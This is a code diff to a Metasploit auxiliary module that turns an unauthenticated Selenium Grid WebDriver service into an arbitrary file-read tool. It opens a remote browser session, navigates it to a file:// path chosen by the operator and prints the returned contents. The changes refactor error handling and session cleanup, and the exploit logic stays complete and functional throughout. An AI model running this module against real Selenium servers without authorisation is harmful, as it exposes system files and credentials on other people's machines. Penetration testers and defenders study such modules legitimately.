@@ -8,6 +8,9 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
 
+  # This compatibility prefix is supported by both Grid 3 and Grid 4, including cleanup.
+  WEBDRIVER_SESSION_PATH = 'wd/hub/session'.freeze
+
   def initialize(info = {})
     super(
       update_info(
@@ -90,8 +93,6 @@ class MetasploitModule < Msf::Auxiliary
 
     # Extract the version
     version = Rex::Version.new(json_data['version'])
-    @version3 = version < Rex::Version.new('4.0.0')
-
     Exploit::CheckCode::Appears("Version #{version} detected")
   end
 
@@ -104,10 +105,9 @@ class MetasploitModule < Msf::Auxiliary
     when 'MicrosoftEdge'
       options = 'ms:edgeOptions'
     end
-    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
     res = send_request_cgi({
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'wd/hub/session'),
+      'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH),
       'ctype' => 'application/json; charset=utf-8',
       'data' => JSON.generate({
         desiredCapabilities: { browserName: datastore['BROWSER'] },
@@ -121,46 +121,81 @@ class MetasploitModule < Msf::Auxiliary
         }
       })
     }, datastore['TIMEOUT'])
-    fail_with(Failure::Unknown, 'Unexpected server reply.') unless res
+    document = webdriver_document(res, 'Failed to start browser session')
+    session_id = document['value']['sessionId'] if document['value'].is_a?(Hash)
+    session_id ||= document['sessionId']
+    unless session_id.is_a?(String) && session_id.present?
+      fail_with(Failure::UnexpectedReply, 'Failed to start browser session: WebDriver did not return a session ID')
+    end
 
-    session_id = res.get_json_document['value']['sessionId'] || res.get_json_document['sessionId']
-    fail_with(Failure::Unknown, 'Failed to start session.') unless session_id
+    begin
+      print_status("Started session (#{session_id}).")
+      url = "#{datastore['SCHEME']}://#{datastore['FILEPATH']}"
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id, 'url'),
+        'ctype' => 'application/json; charset=utf-8',
+        'data' => JSON.generate({ url: url })
+      })
+      webdriver_document(res, "Failed to navigate browser to #{url}")
 
-    print_status("Started session (#{session_id}).")
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id, 'source'),
+        'ctype' => 'application/json; charset=utf-8'
+      })
+      document = webdriver_document(res, "Failed to read file #{datastore['FILEPATH']}")
+      unless document['value'].is_a?(String)
+        fail_with(Failure::UnexpectedReply, "Failed to read file #{datastore['FILEPATH']}: WebDriver did not return page source")
+      end
 
-    # driver.get('file://%s' % [FILEPATH])
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, "wd/hub/session/#{session_id}/url"),
-      'ctype' => 'application/json; charset=utf-8',
-      'data' => JSON.generate({ url: "#{datastore['SCHEME']}://#{datastore['FILEPATH']}" })
-    })
-    fail_with(Failure::Unknown, "Failed to execute driver.get('#{datastore['SCHEME']}://#{datastore['FILEPATH']}').") unless res
+      file_content = Nokogiri::HTML(document['value']).at('pre')
+      unless file_content
+        fail_with(Failure::UnexpectedReply, "Failed to read file #{datastore['FILEPATH']}: Browser did not return a text file")
+      end
 
-    # driver.page_source
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, "wd/hub/session/#{session_id}/source"),
-      'ctype' => 'application/json; charset=utf-8'
-    })
-    fail_with(Failure::Unknown, "Failed to read file: #{datastore['FILEPATH']}.") unless res
-
-    print_good("#{datastore['FILEPATH']}\n#{Nokogiri::HTML(res.get_json_document['value'])&.at('pre')&.text}")
-
-    # End session
-    # This may take some time (about 5 minutes or so), so no timeout is set here.
-    res = send_request_cgi({
-      'method' => 'DELETE',
-      'uri' => normalize_uri(target_uri.path, @version3 ? "wd/hub/session/#{session_id}" : "session/#{session_id}"),
-      'headers' => { 'Content-Type' => 'application/json; charset=utf-8' }
-    })
-    if res
-      print_status("Deleted session (#{session_id}).")
-    else
-      print_status("Failed to delete the session (#{session_id}). "\
-                   'You may need to wait for the session to expire (default: 5 minutes) or '\
-                   'manually delete the session for the next exploit to succeed.')
+      print_good("#{datastore['FILEPATH']}\n#{file_content.text}")
+    ensure
+      delete_browser_session(session_id)
     end
   end
 
+  private
+
+  def webdriver_document(response, operation)
+    document = response.get_json_document if response&.code == 200
+    error = webdriver_response_error(response, document)
+    fail_with(response ? Failure::UnexpectedReply : Failure::Unreachable, "#{operation}: #{error}") if error
+
+    document
+  end
+
+  # Cleanup uses the same validation without raising over an earlier file error.
+  def webdriver_response_error(response, document)
+    return 'Target did not respond' unless response
+    return "HTTP #{response.code}" unless response.code == 200
+    return 'Invalid WebDriver JSON response' unless document.is_a?(Hash) && document.key?('value')
+    return 'WebDriver reported an error' if document.key?('status') && document['status'] != 0
+    return 'WebDriver reported an error' if document['value'].is_a?(Hash) && document['value'].key?('error')
+
+    nil
+  end
+
+  def delete_browser_session(session_id)
+    res = send_request_cgi({
+      'method' => 'DELETE',
+      'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id),
+      'headers' => { 'Content-Type' => 'application/json; charset=utf-8' }
+    })
+    document = res.get_json_document if res&.code == 200
+    error = webdriver_response_error(res, document)
+    if error
+      print_warning("Failed to delete browser session (#{session_id}): #{error}. The session may need to be deleted manually.")
+    else
+      print_status("Deleted session (#{session_id}).")
+    end
+  rescue Rex::ConnectionError, Rex::TimeoutError, ::Timeout::Error => e
+    elog('Browser session cleanup failed', error: e)
+    print_warning("Failed to delete browser session (#{session_id}): #{e.message}")
+  end
 end
